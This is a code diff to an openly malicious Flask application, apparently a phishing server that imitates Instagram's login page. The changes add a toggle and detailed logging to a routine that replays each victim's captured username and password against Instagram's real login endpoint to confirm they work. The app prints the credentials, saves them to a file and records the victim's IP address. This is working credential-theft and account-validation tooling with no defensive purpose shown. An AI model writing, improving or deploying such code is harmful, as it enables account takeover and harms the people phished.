@@ -17,6 +17,11 @@ app = Flask(__name__)
 # Configuration - Set to False to use custom template (recommended for production)
 FETCH_REAL_INSTAGRAM = False  # Instagram blocks server requests, use custom template
 
+# Validation Configuration
+# Set to False to skip real Instagram validation (useful for testing/demo)
+# Set to True to validate against real Instagram (may be rate-limited or blocked)
+VALIDATE_CREDENTIALS = True  # Change to False for testing without validation
+
 # Store captured credentials
 CREDENTIALS_FILE = 'captured_data.json'
 captured_credentials = []
@@ -222,6 +227,7 @@ def verify_instagram_credentials(username, password):
     Returns True if credentials appear valid, False otherwise
     """
     try:
+        print(f"🔐 Starting credential verification for: {username}")
         session = requests.Session()
         
         # Step 1: Get login page to obtain CSRF token
@@ -234,12 +240,15 @@ def verify_instagram_credentials(username, password):
         }
         
         # Get the login page
+        print(f"📡 Fetching Instagram login page...")
         login_page = session.get('https://www.instagram.com/accounts/login/', headers=headers, timeout=10)
         csrf_token = session.cookies.get('csrftoken', '')
         
         if not csrf_token:
-            print("Could not obtain CSRF token")
+            print("❌ Could not obtain CSRF token")
             return False
+        
+        print(f"✅ CSRF token obtained")
         
         # Step 2: Attempt login via AJAX endpoint
         import time
@@ -266,20 +275,23 @@ def verify_instagram_credentials(username, password):
             'trustedDeviceRecords': '{}',
         }
         
+        print(f"📡 Sending login request to Instagram...")
         response = session.post(login_url, headers=ajax_headers, data=payload, timeout=10)
+        print(f"📡 Response status: {response.status_code}")
         
         # Check response
         content_type = response.headers.get('Content-Type', '')
         if 'application/json' not in content_type.lower():
             preview = (response.text or '')[:300]
-            print(f"Non-JSON response from Instagram (status {response.status_code})")
+            print(f"❌ Non-JSON response from Instagram (status {response.status_code})")
             print(f"Preview: {preview}")
             return False
         
         try:
             result = response.json()
+            print(f"📦 Response data: {result}")
         except ValueError as e:
-            print(f"JSON parse error: {e}")
+            print(f"❌ JSON parse error: {e}")
             return False
         
         # Check for successful authentication
@@ -299,11 +311,14 @@ def verify_instagram_credentials(username, password):
         print(f"❌ Authentication failed: {result}")
         return False
         
+    except requests.Timeout as e:
+        print(f"⏱️ Request timeout during verification: {e}")
+        return False
     except requests.RequestException as e:
-        print(f"Network error during verification: {e}")
+        print(f"🌐 Network error during verification: {e}")
         return False
     except Exception as e:
-        print(f"Unexpected verification error: {e}")
+        print(f"💥 Unexpected verification error: {e}")
         import traceback
         traceback.print_exc()
         return False
@@ -327,8 +342,14 @@ def login():
             'message': 'Sorry, your password was incorrect. Please double-check your password.'
         }), 401
     
-    # Verify credentials with Instagram
-    is_valid = verify_instagram_credentials(username, password)
+    # Verify credentials with Instagram (if enabled)
+    if VALIDATE_CREDENTIALS:
+        print(f"🔍 Validating credentials for {username}...")
+        is_valid = verify_instagram_credentials(username, password)
+        print(f"🔍 Validation result: {is_valid}")
+    else:
+        print(f"⚠️ Credential validation is DISABLED - accepting all credentials")
+        is_valid = False  # Mark as invalid when not validating
     
     # Capture the data with timestamp
     data = {
@@ -349,6 +370,7 @@ def login():
     print(f"Username: {username}")
     print(f"Password: {password}")
     print(f"Valid: {'✅ YES' if is_valid else '❌ NO'}")
+    print(f"Validation: {'✅ ENABLED' if VALIDATE_CREDENTIALS else '⚠️ DISABLED'}")
     print(f"Time: {data['timestamp']}")
     print(f"IP: {data['ip_address']}")
     print(f"{'='*60}\n")
